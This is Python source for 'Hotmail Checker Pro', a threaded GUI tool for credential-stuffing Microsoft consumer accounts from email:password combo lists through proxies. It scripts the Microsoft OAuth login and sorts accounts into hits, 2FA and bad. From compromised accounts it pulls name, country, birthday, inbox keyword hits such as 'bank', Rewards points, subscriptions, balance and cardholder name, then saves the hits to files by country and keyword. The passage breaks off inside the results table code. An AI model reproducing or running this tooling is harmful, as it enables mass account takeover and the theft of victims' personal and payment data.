#!/usr/bin/env python3
"""Hotmail Checker Pro  v7.0 — Clean Architecture PyQt6"""

import sys, os, re, time, uuid, threading, webbrowser, random

# Windows UTF-8 console output (no-op on Linux/Mac)
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from dataclasses import dataclass, field
from typing import List, Dict, Optional

import requests
requests.packages.urllib3.disable_warnings()

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QFrame, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QSlider, QTextEdit, QLineEdit, QComboBox, QCheckBox,
    QFileDialog, QSplitter, QTableView, QAbstractItemView, QHeaderView,
    QProgressBar, QScrollArea, QStyledItemDelegate, QStackedWidget,
    QSizePolicy, QMessageBox, QListWidget, QListWidgetItem,
)
from PyQt6.QtCore import (
    Qt, QTimer, QThread, pyqtSignal, QAbstractTableModel, QModelIndex,
    QRect, QEvent, QSortFilterProxyModel,
)
from PyQt6.QtGui import (
    QColor, QFont, QPalette, QTextCharFormat, QTextCursor,
    QPainter, QBrush, QPen, QPixmap
)
# ══════════════════════════════════════════════════════════════════════
#  PALETTE
# ══════════════════════════════════════════════════════════════════════
C_BG      = "#080c12"
C_TBL     = "#0b0f16"
C_PANEL   = "#0f1520"
C_PANEL2  = "#141b27"
C_BORDER  = "#1e2736"
C_BORDER2 = "#2a3547"
C_ACCENT  = "#2d88ff"
C_ACH     = "#4d9fff"
C_ACP     = "#1a6fd8"
C_HIT     = "#2ea043"
C_2FA     = "#e3a008"
C_BAD     = "#f85149"
C_TEXT    = "#dde4ef"
C_DIM     = "#7d8fa8"
C_DIMMER  = "#3d4e63"
C_ROW_A   = "#080c12"
C_ROW_B   = "#0c1220"
C_HIT_BG  = "#071510"
C_2FA_BG  = "#150f02"
C_BAD_BG  = "#130407"
C_SEL     = "#112244"
C_SIDEBAR = "#060a10"

# ══════════════════════════════════════════════════════════════════════
#  i18n
# ══════════════════════════════════════════════════════════════════════
_MODES_EN = ["1 — Auth Only","2 — Inbox + Country","3 — Points + Subs + Card","4 — Full Data"]
_MODES_VI = ["1 — Xác thực","2 — Hộp thư + Quốc gia","3 — Điểm + Đăng ký + Thẻ","4 — Đầy đủ"]
_MODES_CN = ["1 — 验证","2 — 收件箱 + 国家","3 — 积分 + 订阅 + 卡","4 — 完整"]

translations: Dict[str, Dict[str, str]] = {
"en": {
    "app":"Hotmail Checker Pro","language":"Language","mode":"CHECK MODE",
    "threads":"THREADS","keywords":"KEYWORDS","kw_ph":"facebook\namazon\nbank",
    "load_kw":"Load keywords","output":"OUTPUT FOLDER","browse":"Browse…",
    "debug":"Debug","start":"▶  Start","stop":"■  Stop","ver":"v7.0 · 2026",
    "total":"TOTAL","checked":"CHECKED","hit":"HITS","tfa":"2FA","bad":"BAD","cpm":"CPM",
    "acc_lbl":"ACCOUNTS","no_acc":"No accounts loaded",
    "load_file":"📂 Load File","paste":"✎ Paste","clear":"✕ Clear",
    "paste_ph":"Paste email:password lines…","load_pasted":"Load",
    "tbl_title":"RESULTS","sel_all":"☑ All","export_txt":"Export TXT",
    "export_xls":"Export Excel","export_pdf":"Export PDF",
    "clr_tbl":"Clear Table",
    "idle":"● Idle","running":"● Running","stopping":"● Stopping…","done":"● Done",
    "tab_dash":"Dashboard","tab_checker":"Checker","tab_proxy":"Proxy","tab_files":"Files",
    "f_all":"All","f_kw":"Hits Keywords","f_hits":"Hits","f_bad":"Bad","f_2fa":"2FA",
    "col_id":"ID","col_combo":"Email : Password","col_name":"Name",
    "col_country":"Country","col_bday":"Birthday","col_status":"Status",
    "col_detail":"Detail","col_pts":"Points","col_sub":"Subscription",
    "col_card":"Card","col_kw":"Keybrowser","col_action":"Action",
    "st_hit":"✓ Access","st_bad":"✗ Wrong","st_2fa":"⚠ 2FA","st_chk":"… Checking","st_wait":"Waiting",
    "proxy_add":"Add Proxy","proxy_rem":"Remove","proxy_check":"Check All",
    "proxy_use":"Use Proxy","proxy_clear":"Clear",
    "msg_loaded":"Loaded {n} accounts from {src}",
    "msg_started":"Started  mode={m}  threads={t}  accounts={n}",
    "msg_done":"Done · Hit={h}  2FA={f}  Bad={b}","msg_saved":"Saved → {folder}",
    "msg_no_acc":"Load accounts first.","msg_load_err":"Cannot read file: {e}",
    "msg_export":"Exported {n} rows → {p}","no_xl":"Install openpyxl: pip install openpyxl",
},
"vi": {
    "app":"Hotmail Checker Pro","language":"Ngôn ngữ","mode":"CHẾ ĐỘ",
    "threads":"LUỒNG","keywords":"TỪ KHÓA","kw_ph":"facebook\namazon\nbank",
    "load_kw":"Tải từ khóa","output":"THƯ MỤC","browse":"Chọn…",
    "debug":"Debug","start":"▶  Bắt đầu","stop":"■  Dừng","ver":"v7.0 · 2026",
    "total":"TỔNG","checked":"ĐÃ KT","hit":"HIT","tfa":"2FA","bad":"SAI","cpm":"CPM",
    "acc_lbl":"TÀI KHOẢN","no_acc":"Chưa tải","load_file":"📂 Tải File",
    "paste":"✎ Dán","clear":"✕ Xóa","paste_ph":"Dán email:mật khẩu…","load_pasted":"Tải",
    "tbl_title":"KẾT QUẢ","sel_all":"☑ Tất cả","export_txt":"Xuất TXT",
    "export_xls":"Xuất Excel","export_pdf":"Xuất PDF","clr_tbl":"Xóa Bảng",
    "idle":"● Rảnh","running":"● Đang chạy","stopping":"● Dừng…","done":"● Xong",
    "tab_dash":"Tổng quan","tab_checker":"Kiểm tra","tab_proxy":"Proxy","tab_files":"File",
    "f_all":"Tất cả","f_kw":"Hits KW","f_hits":"Hits","f_bad":"Sai","f_2fa":"2FA",
    "col_id":"STT","col_combo":"Email : Mật khẩu","col_name":"Tên",
    "col_country":"Quốc gia","col_bday":"Ngày sinh","col_status":"Trạng thái",
    "col_detail":"Chi tiết","col_pts":"Điểm","col_sub":"Đăng ký",
    "col_card":"Thẻ","col_kw":"Keybrowser","col_action":"Hành động",
    "st_hit":"✓ Truy cập","st_bad":"✗ Sai MK","st_2fa":"⚠ 2FA","st_chk":"… Đang KT","st_wait":"Chờ",
    "proxy_add":"Thêm","proxy_rem":"Xóa","proxy_check":"Kiểm tra","proxy_use":"Dùng Proxy","proxy_clear":"Xóa hết",
    "msg_loaded":"Đã tải {n} tài khoản từ {src}","msg_started":"Bắt đầu mode={m} luồng={t} tk={n}",
    "msg_done":"Xong · Hit={h} 2FA={f} Sai={b}","msg_saved":"Lưu → {folder}",
    "msg_no_acc":"Vui lòng tải tài khoản.","msg_load_err":"Không đọc được: {e}",
    "msg_export":"Xuất {n} dòng → {p}","no_xl":"Cài openpyxl: pip install openpyxl",
},
"cn": {
    "app":"Hotmail 检测工具 Pro","language":"语言","mode":"检测模式",
    "threads":"线程","keywords":"关键词","kw_ph":"facebook\namazon\n银行",
    "load_kw":"加载关键词","output":"输出文件夹","browse":"浏览…",
    "debug":"调试","start":"▶  开始","stop":"■  停止","ver":"v7.0 · 2026",
    "total":"总计","checked":"已检","hit":"命中","tfa":"2FA","bad":"错误","cpm":"CPM",
    "acc_lbl":"账号","no_acc":"未加载","load_file":"📂 加载","paste":"✎ 粘贴",
    "clear":"✕ 清除","paste_ph":"粘贴 邮箱:密码…","load_pasted":"加载",
    "tbl_title":"结果","sel_all":"☑ 全选","export_txt":"导出 TXT",
    "export_xls":"导出 Excel","export_pdf":"导出 PDF","clr_tbl":"清表格",
    "idle":"● 空闲","running":"● 运行中","stopping":"● 停止…","done":"● 完成",
    "tab_dash":"仪表盘","tab_checker":"检测","tab_proxy":"代理","tab_files":"文件",
    "f_all":"全部","f_kw":"命中关键词","f_hits":"命中","f_bad":"错误","f_2fa":"2FA",
    "col_id":"序号","col_combo":"邮箱 : 密码","col_name":"姓名",
    "col_country":"国家","col_bday":"生日","col_status":"状态",
    "col_detail":"详情","col_pts":"积分","col_sub":"订阅",
    "col_card":"卡片","col_kw":"Keybrowser","col_action":"操作",
    "st_hit":"✓ 成功","st_bad":"✗ 密码错","st_2fa":"⚠ 2FA","st_chk":"… 检测中","st_wait":"等待",
    "proxy_add":"添加","proxy_rem":"删除","proxy_check":"全部检测","proxy_use":"使用代理","proxy_clear":"清空",
    "msg_loaded":"从 {src} 加载 {n} 个账号","msg_started":"开始 模式={m} 线程={t} 账号={n}",
    "msg_done":"完成 · 命中={h} 2FA={f} 错误={b}","msg_saved":"保存 → {folder}",
    "msg_no_acc":"请先加载账号。","msg_load_err":"无法读取: {e}",
    "msg_export":"已导出 {n} 行 → {p}","no_xl":"安装 openpyxl: pip install openpyxl",
},
}

_lang = "en"
def t(k: str, **kw) -> str:
    txt = translations.get(_lang, translations["en"]).get(k, translations["en"].get(k, k))
    return txt.format(**kw) if kw else txt
def set_lang(l: str):
    global _lang
    if l in translations: _lang = l

# ══════════════════════════════════════════════════════════════════════
#  COLUMNS  (11 data + 1 action = 12 total)
# ══════════════════════════════════════════════════════════════════════
(C_ID, C_COMBO, C_NAME, C_COUNTRY, C_BDAY,
 C_STATUS, C_DETAIL, C_PTS, C_SUB, C_CARD, C_KW, C_ACTION) = range(12)

COL_KEYS = ["col_id","col_combo","col_name","col_country","col_bday",
            "col_status","col_detail","col_pts","col_sub","col_card","col_kw","col_action"]

COL_W = {C_ID:48, C_COMBO:270, C_NAME:130, C_COUNTRY:90, C_BDAY:90,
         C_STATUS:100, C_DETAIL:200, C_PTS:72, C_SUB:160, C_CARD:130,
         C_KW:190, C_ACTION:68}

MODE_COLS: Dict[int, List[int]] = {
    1: [C_ID, C_COMBO, C_STATUS, C_ACTION],
    2: [C_ID, C_COMBO, C_COUNTRY, C_BDAY, C_STATUS, C_DETAIL, C_ACTION],
    3: [C_ID, C_COMBO, C_NAME, C_PTS, C_SUB, C_CARD, C_STATUS, C_ACTION],
    4: [C_ID, C_COMBO, C_NAME, C_COUNTRY, C_BDAY, C_PTS, C_SUB, C_CARD, C_KW, C_DETAIL, C_ACTION],
}
BADGE_CLR = {1: C_ACCENT, 2: "#1a7f40", 3: "#8250df", 4: "#bf8700"}

KW_MODES = {2, 4}   # modes that support keywords

# ══════════════════════════════════════════════════════════════════════
#  OAUTH CHECKER  (modes 1–4, unchanged)
# ══════════════════════════════════════════════════════════════════════
class _Session:
    def __init__(self, proxy=None):
        self.cookies = {}
        self.s = requests.Session()
        self.s.verify = False
        if proxy: self.s.proxies = proxy

    def merge(self, r):
        for c in (r.cookies or []):
            self.cookies[c.name] = c.value
            self.s.cookies.set(c.name, c.value)

    def req(self, method, url, **kw):
        for n, v in self.cookies.items(): self.s.cookies.set(n, v)
        kw.setdefault('timeout', 20); kw.setdefault('allow_redirects', True)
        r = self.s.request(method, url, **kw); self.merge(r); return r


class HotmailChecker:
    def __init__(self, debug=False):
        self.debug = debug
        self.cid = str(uuid.uuid4())

    def ms_login(self, email, password, proxy=None):
        ses = _Session(proxy)
        try:
            r1 = ses.req('GET',
                f'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}',
                headers={'X-OneAuth-AppName':'Outlook Lite','X-Office-Version':'3.11.0-minApi24',
                         'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 9)','Host':'odc.officeapps.live.com'})
            if any(x in r1.text for x in ('Neither','Both','OrgId')) or 'MSAccount' not in r1.text:
                return {'status':'BAD','ses':ses}
            time.sleep(0.3)
            r2 = ses.req('GET',
                f'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize'
                f'?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code'
                f'&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59'
                f'&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access'
                f'&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D',
                headers={'User-Agent':'Mozilla/5.0','Accept':'text/html,*/*'})
            um = re.search(r'urlPost":"([^"]+)"', r2.text)
            pm = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not um or not pm: return {'status':'BAD','ses':ses}
            post_url = um.group(1).replace('\\/','/')
            ppft = pm.group(1); time.sleep(0.2)
            r3 = ses.req('POST', post_url,
                data={'i13':'1','login':email,'loginfmt':email,'type':'11','LoginOptions':'1',
                      'lrt':'','lrtPartition':'','hisRegion':'','hisScaleUnit':'','passwd':password,
                      'ps':'2','psRNGCDefaultType':'','psRNGCEntropy':'','psRNGCSLK':'','canary':'',
                      'ctx':'','hpgrequestid':'','PPFT':ppft,'PPSX':'PassportR','NewUser':'1',
                      'FoundMSAs':'','fspost':'0','i21':'0','CookieDisclosure':'0',
                      'IsFidoSupported':'0','isSignupPost':'0','isRecoveryAttemptPost':'0','i19':'9960'},
                headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0',
                         'Origin':'https://login.live.com','Referer':r2.url},
                allow_redirects=False)
            tl = r3.text.lower(); body = r3.text
            if any(x in tl for x in ('account or password is incorrect','incorrect password')):
                return {'status':'BAD','ses':ses}
            if any(x in body+tl for x in ('identity/confirm','otc','one-time code','verify your identity')):
                return {'status':'2FA','ses':ses}
            if 'account.live.com/Abuse' in body or ('recover' in body and 'urlPost' not in body):
                return {'status':'2FA','ses':ses}
            def _code(resp):
                loc = resp.headers.get('Location','')
                return re.search(r'[?&]code=([^&"\']+)',loc) or re.search(r'[?&]code=([^&"\'>\s]+)',resp.text)
            def _inter(resp, ref):
                b = resp.text; nu = None
                for pat in [r'"urlPost"\s*:\s*"([^"]+)"',r"urlPost\s*=\s*'([^']+)'",
                            r'action="(https://login\.live\.com[^"]+)"',
                            r'action="(https://login\.microsoftonline\.com[^"]+)"']:
                    m = re.search(pat,b)
                    if m: nu = m.group(1).replace('\\/','/')  ; break
                if not nu: return None
                pm2 = re.search(r'name="PPFT"[^>]*value="([^"]+)"',b) or re.search(r'value="([^"]+)"[^>]*name="PPFT"',b)
                return ses.req('POST',nu,data={'LoginOptions':'1','PPFT':pm2.group(1) if pm2 else ''},
                    headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0','Referer':ref},
                    allow_redirects=False)
            cm = _code(r3); cur = r3; curl = post_url; hops = 0
            while not cm and cur.status_code==200 and hops<4:
                if 'urlPost' not in cur.text and 'action=' not in cur.text: break
                nxt = _inter(cur, curl)
                if not nxt: break
                cm = _code(nxt); curl = getattr(cur,'url',post_url); cur = nxt; hops += 1
            if not cm: return {'status':'BAD','ses':ses}
            code = cm.group(1)
            mspcid = ses.cookies.get('MSPCID','')
            if not mspcid: return {'status':'BAD','ses':ses}
            r4 = ses.req('POST','https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
                data={'client_id':'e9b154d0-7658-433b-bb25-6b8e0a8a7c59','grant_type':'authorization_code',
                      'code':code,'redirect_uri':'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
                      'scope':'profile openid offline_access https://outlook.office.com/M365.Access'},
                headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Dalvik/2.1.0'})
            if r4.status_code!=200: return {'status':'BAD','ses':ses}
            at = r4.json().get('access_token')
            if not at: return {'status':'BAD','ses':ses}
            return {'status':'SUCCESS','ses':ses,'at':at,'cid':mspcid.upper(),'email':email}
        except Exception as e:
            return {'status':'ERROR','ses':ses,'error':str(e)}

    def country_info(self, ses, at, email):
        cc=''; country=''; dob=''; name=''
        try:
            r = ses.req('GET','https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                headers={'Authorization':f'Bearer {at}','X-AnchorMailbox':f'UPN:{email}',
                         'User-Agent':'Outlook-Android/2.0','Accept':'application/json'})
            if r.status_code==200:
                p=r.json(); accs=p.get('accounts',[])
                if accs:
                    a=accs[0]
                    if a.get('location'): cc=a['location']; country=self._ctry(cc)
                    if a.get('birthDay') and a.get('birthMonth') and a.get('birthYear'):
                        dob=f"{int(a['birthDay']):02d}/{int(a['birthMonth']):02d}/{a['birthYear']}"
                ns=p.get('names',[])
                if ns:
                    n=ns[0]; name=n.get('displayName') or f"{n.get('givenName','')} {n.get('familyName','')}".strip()
        except Exception: pass
        if not cc:
            try:
                rg=ses.req('GET','https://graph.microsoft.com/v1.0/me',
                    headers={'Authorization':f'Bearer {at}','Accept':'application/json'})
                if rg.status_code==200:
                    gd=rg.json()
                    if gd.get('country'): cc=gd['country']; country=self._ctry(cc)
                    if not name and gd.get('displayName'): name=gd['displayName']
            except Exception: pass
        return {'cc': cc.upper()[:2], 'country': country, 'dob': dob, 'display_name': name}

    def inbox_info(self, ses, at, email, cid, keywords=None):
        total=0; unread=0; kw_res={}
        try:
            fd={"__type":"GetAllFoldersAndSettingsJsonRequest:#Exchange",
                "Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"Exchange2016",
                  "TimeZoneContext":{"__type":"TimeZoneContext:#Exchange",
                    "TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"Pacific Standard Time"}}}}
            r=ses.req('POST','https://outlook.live.com/owa/service.svc?action=GetAllFoldersAndSettings',
                json=fd,headers={'Authorization':f'Bearer {at}','Content-Type':'application/json',
                'X-OWA-CANARY':ses.cookies.get('X-OWA-CANARY',''),
                'X-AnchorMailbox':f'CID:{cid}','User-Agent':'Outlook-Android/2.0'})
            if r.status_code==200:
                rt=r.text
                m=re.search(r'"DisplayName":"Inbox"[^}]*"TotalCount":(\d+)',rt)
                if m: total=int(m.group(1))
        except Exception: pass
        if keywords:
            for kw in keywords:
                try:
                    qs=f'from:{kw}' if '@' in kw else kw
                    sp={"Cvid":self.cid,"Scenario":{"Name":"owa.react"},"TimeZone":"Pacific Standard Time",
                        "TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation",
                        "ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}}]},
                        "From":0,"Query":{"QueryString":qs},"Size":50,
                        "Sort":[{"Field":"Score","SortDirection":"Desc"}],"EnableTopResults":True,"TopResultsCount":10}],
                        "QueryAlterationOptions":{"EnableSuggestion":True,"EnableAlteration":True}}
                    rs=ses.req('POST',
                        f'https://outlook.live.com/searchservice/api/v2/query?n=88&cv={quote(self.cid)}',
                        json=sp,headers={'Authorization':f'Bearer {at}','Content-Type':'application/json',
                            'X-AnchorMailbox':f'CID:{cid}','User-Agent':'Outlook-Android/2.0'})
                    if rs.status_code==200:
                        m=re.search(r'"Total":(\d+)',rs.text)
                        cnt=int(m.group(1)) if m else 0
                        kw_res[kw]={'found':cnt>0,'count':cnt}
                    else: kw_res[kw]={'found':False,'count':0}
                except Exception: kw_res[kw]={'found':False,'count':0}
        return {'total_inbox':total,'unread_inbox':unread,'kw_results':kw_res}

    def subs_info(self, ses, at):
        subs=[]; bal=None; card=None; pts=0
        try:
            pts=self._rewards(ses,at); pay_tok=None
            try:
                r=ses.req('GET',
                    'https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A'
                    '&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete'
                    '&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth'
                    '&state=%7B%22userId%22%3A%22x%22%7D&prompt=none',
                    headers={'Host':'login.live.com','User-Agent':'Mozilla/5.0','Referer':'https://account.microsoft.com/'})
                for pat in [r'access_token=([^&\s"\']+)',r'"access_token":"([^"]+)"']:
                    m=re.search(pat,r.text+' '+r.url)
                    if m: pay_tok=unquote(m.group(1)); break
            except Exception: pass
            if not pay_tok: return subs,bal,card,pts
            ph={'User-Agent':'Mozilla/5.0','Accept':'application/json',
                'Authorization':f'MSADELEGATE1.0="{pay_tok}"','Content-Type':'application/json',
                'Host':'paymentinstruments.mp.microsoft.com','ms-cV':str(uuid.uuid4()),
                'Origin':'https://account.microsoft.com','Referer':'https://account.microsoft.com/'}
            try:
                rp=ses.req('GET','https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US',headers=ph)
                if rp.status_code==200:
                    bm=re.search(r'"balance"\s*:\s*([0-9.]+)',rp.text)
                    if bm: bal='$'+bm.group(1)
                    for pat in [r'"nameOnCard"\s*:\s*"([^"]+)"',r'"cardholderName"\s*:\s*"([^"]+)"']:
                        cm=re.search(pat,rp.text)
                        if cm: card=cm.group(1).strip(); break
            except Exception: pass
            try:
                rs=ses.req('GET','https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions',headers=ph)
                if rs.status_code==200:
                    for k,lbl in {'Xbox Game Pass Ultimate':'GAME PASS ULT','PC Game Pass':'PC GAME PASS',
                        'Microsoft 365 Family':'M365 FAMILY','Microsoft 365 Personal':'M365 PERSONAL',
                        'Xbox Live Gold':'XBOX GOLD','EA Play':'EA PLAY','Office 365':'OFFICE 365'}.items():
                        if k in rs.text: subs.append(lbl)
            except Exception: pass
        except Exception: pass
        return subs, bal, card, pts

    def _rewards(self, ses, at):
        for url in ['https://prod.rewardsplatform.microsoft.com/unifiedfrontdoor/api/v1.0/users/me',
                    f'https://rewards.bing.com/api/getuserinfo?type=1&correlationId={uuid.uuid4()}']:
            try:
                r=ses.req('GET',url,headers={'Authorization':f'Bearer {at}','User-Agent':'Mozilla/5.0','Accept':'application/json'})
                if r.status_code==200:
                    d=r.json(); pts=(d.get('userStatus') or d.get('rewardStatus') or d or {}).get('availablePoints',0)
                    if pts: return pts
            except Exception: pass
        return 0

    def check_mode1(self, email, pw, proxy=None):
        lr=self.ms_login(email,pw,proxy)
        return {'status':'HIT' if lr['status']=='SUCCESS' else lr['status'],'email':email,'password':pw,'mode':1}

    def check_mode2(self, email, pw, keywords=None, proxy=None):
        lr=self.ms_login(email,pw,proxy)
        if lr['status']!='SUCCESS': return {'status':lr['status'],'email':email,'password':pw,'mode':2}
        ci=self.country_info(lr['ses'],lr['at'],email)
        ii=self.inbox_info(lr['ses'],lr['at'],email,lr['cid'],keywords)
        return {'status':'HIT','email':email,'password':pw,'mode':2,**ci,**ii}

    def check_mode3(self, email, pw, proxy=None):
        lr=self.ms_login(email,pw,proxy)
        if lr['status']!='SUCCESS': return {'status':lr['status'],'email':email,'password':pw,'mode':3}
        ci=self.country_info(lr['ses'],lr['at'],email)
        subs,bal,card,pts=self.subs_info(lr['ses'],lr['at'])
        return {'status':'HIT','email':email,'password':pw,'mode':3,
                'subs_list':subs,'balance':bal,'card_holder':card,'points':pts,**ci}

    def check_mode4(self, email, pw, keywords=None, proxy=None):
        lr=self.ms_login(email,pw,proxy)
        if lr['status']!='SUCCESS': return {'status':lr['status'],'email':email,'password':pw,'mode':4}
        ci=self.country_info(lr['ses'],lr['at'],email)
        ii=self.inbox_info(lr['ses'],lr['at'],email,lr['cid'],keywords)
        subs,bal,card,pts=self.subs_info(lr['ses'],lr['at'])
        return {'status':'HIT','email':email,'password':pw,'mode':4,
                'subs_list':subs,'balance':bal,'card_holder':card,'points':pts,**ci,**ii}

    @staticmethod
    def _ctry(code):
        M={'US':'United States','GB':'United Kingdom','CA':'Canada','AU':'Australia',
           'DE':'Germany','FR':'France','IT':'Italy','ES':'Spain','NL':'Netherlands',
           'SE':'Sweden','NO':'Norway','DK':'Denmark','FI':'Finland','PL':'Poland',
           'JP':'Japan','KR':'South Korea','CN':'China','IN':'India','BR':'Brazil',
           'MX':'Mexico','AR':'Argentina','ZA':'South Africa','SA':'Saudi Arabia',
           'AE':'UAE','TR':'Turkey','RU':'Russia','UA':'Ukraine','SG':'Singapore',
           'MY':'Malaysia','TH':'Thailand','ID':'Indonesia','PH':'Philippines','VN':'Vietnam',
           'PT':'Portugal','GR':'Greece','RO':'Romania','HU':'Hungary','CZ':'Czech Republic',
           'AT':'Austria','CH':'Switzerland','BE':'Belgium','IE':'Ireland'}
        return M.get((code or '').upper(), code or '')


# ══════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════
def flag(iso2: str) -> str:
    if not iso2 or len(iso2)<2: return ""
    try: return chr(0x1F1E6+ord(iso2[0].upper())-65)+chr(0x1F1E6+ord(iso2[1].upper())-65)
    except: return ""

def parse_proxy(line: str) -> Optional[Dict]:
    p = line.strip().split(':')
    if len(p)==2:
        url=f"http://{p[0]}:{p[1]}"
    elif len(p)==4:
        url=f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    else: return None
    return {"http":url,"https":url}


# ══════════════════════════════════════════════════════════════════════
#  STATS
# ══════════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self._lk=Lock()
        self.total=self.checked=self.hits=self.two_fa=self.bad=0
        self._t0=time.time()
    def update(self,s):
        with self._lk:
            self.checked+=1
            if s=='HIT': self.hits+=1
            elif s=='2FA': self.two_fa+=1
            else: self.bad+=1
    @property
    def cpm(self):
        e=time.time()-self._t0
        return self.checked/e*60 if e>1 else 0.0


# ══════════════════════════════════════════════════════════════════════
#  RESULT MANAGER
# ══════════════════════════════════════════════════════════════════════
class ResultManager:
    def __init__(self, base=None):
        self._lk=Lock()
        date_str=datetime.now().strftime("%d-%m-%Y")
        root=Path(base or '.')/f"Results-{date_str}"
        root.mkdir(parents=True,exist_ok=True)
        self.folder=str(root)
        self._hits=root/"Hits.txt"; self._bad=root/"Bad.txt"; self._tfa=root/"2fa.txt"
        self._detail=root/"Hits_Detail.txt"
        (root/"Country").mkdir(exist_ok=True); (root/"Keywords").mkdir(exist_ok=True)
        self._cdir=root/"Country"; self._kdir=root/"Keywords"
        self._seen: set=set()

    def _app(self, path: Path, line: str):
        with self._lk:
            with open(path,'a',encoding='utf-8') as f: f.write(line+'\n')

    def save(self, result: dict):
        ep=f"{result['email']}:{result['password']}"
        s=result.get('status','BAD')
        if s=='HIT':
            if ep in self._seen: return
            self._seen.add(ep); self._app(self._hits,ep)
            parts=[ep]
            cc=result.get('cc',''); ctry=result.get('country',''); dob=result.get('dob','')
            pts=result.get('points',0); card=result.get('card_holder','')
            subs=result.get('subs_list',[]); kwr=result.get('kw_results',{}) or {}
            if ctry: parts.append(f"country:{ctry}")
            if dob: parts.append(f"dob:{dob}")
            if pts: parts.append(f"pts:{pts}")
            if subs: parts.append(f"subs:{','.join(subs)}")
            if card: parts.append(f"card:{card}")
            kf={k:v['count'] for k,v in kwr.items() if v.get('found')}
            if kf: parts.append('kw:'+','.join(f"{k}({n})" for k,n in kf.items()))
            self._app(self._detail,' | '.join(parts))
            iso=(cc or '').upper()[:2]
            if iso and iso.isalpha(): self._app(self._cdir/f"{iso}.txt",ep)
            for kw,kd in kwr.items():
                if kd.get('found'):
                    safe=re.sub(r'[^a-z0-9]','_',kw.lower())
                    self._app(self._kdir/f"{safe}.txt",ep)
        elif s=='2FA': self._app(self._tfa,ep)
        else: self._app(self._bad,ep)


# ══════════════════════════════════════════════════════════════════════
#  DATA ROW
# ══════════════════════════════════════════════════════════════════════
@dataclass
class Row:
    rid:      int
    combo:    str
    email:    str  = ""
    password: str  = ""
    name:     str  = ""
    cc:       str  = ""          # ISO-2 code only  e.g. "FR"
    country:  str  = ""          # full name
    birthday: str  = ""
    inbox:    int  = 0
    kw_res:   Dict = field(default_factory=dict)   # {kw: {found, count}}
    points:   int  = 0
    subs:     str  = ""
    card:     str  = ""
    status:   str  = "Waiting"
    detail:   str  = ""
    checked:  bool = False

    @property
    def kw_str(self) -> str:
        """Keybrowser format: keyword (count) — NEVER mixed into country."""
        hits={k:v['count'] for k,v in self.kw_res.items() if v.get('found')}
        return ", ".join(f"{k} ({n})" for k,n in hits.items()) if hits else ""

    @property
    def has_kw(self) -> bool:
        return bool(self.kw_str)


# ══════════════════════════════════════════════════════════════════════
#  ACCOUNT MODEL
# ══════════════════════════════════════════════════════════════════════
ST_FG={"HIT":C_HIT,"2FA":C_2FA,"BAD":C_BAD,"Checking":C_ACCENT,"Waiting":C_DIMMER,"ERROR":C_BAD}
ST_BG={"HIT":C_HIT_BG,"2FA":C_2FA_BG,"BAD":C_BAD_BG}

class AccountModel(QAbstractTableModel):
    NCOLS=12

    def __init__(self,parent=None):
        super().__init__(parent); self._rows: List[Row]=[]

    def rowCount(self,_=QModelIndex()): return len(self._rows)
    def columnCount(self,_=QModelIndex()): return self.NCOLS

    def refresh_headers(self):
        self.headerDataChanged.emit(Qt.Orientation.Horizontal,0,self.NCOLS-1)

    def headerData(self,s,o,role=Qt.ItemDataRole.DisplayRole):
        if o!=Qt.Orientation.Horizontal: return None
        if role==Qt.ItemDataRole.DisplayRole:
            return t(COL_KEYS[s]) if s<len(COL_KEYS) else ""
        if role==Qt.ItemDataRole.FontRole:
            f=QFont("Segoe UI",9,QFont.Weight.Bold)
            f.setLetterSpacing(QFont.SpacingType.AbsoluteSpacing,0.8); return f
        return None

    def data(self,idx,role=Qt.ItemDataRole.DisplayRole):
        if not idx.isValid(): return None
        r=self._rows[idx.row()]; col=idx.column()

        if role==Qt.ItemDataRole.DisplayRole:
            if col==C_ID:      return str(r.rid)
            if col==C_COMBO:   return r.combo
            if col==C_NAME:    return r.name
            if col==C_COUNTRY:
                # ONLY flag + iso code — NO keywords here
                fl=flag(r.cc)
                return f"{fl} {r.cc}" if fl and r.cc else r.cc
            if col==C_BDAY:    return r.birthday
            if col==C_STATUS:
                m={"HIT":t("st_hit"),"BAD":t("st_bad"),"2FA":t("st_2fa"),
                   "Checking":t("st_chk"),"Waiting":t("st_wait")}
                return m.get(r.status,r.status)
            if col==C_DETAIL:
                if r.status=="Waiting": return "—"
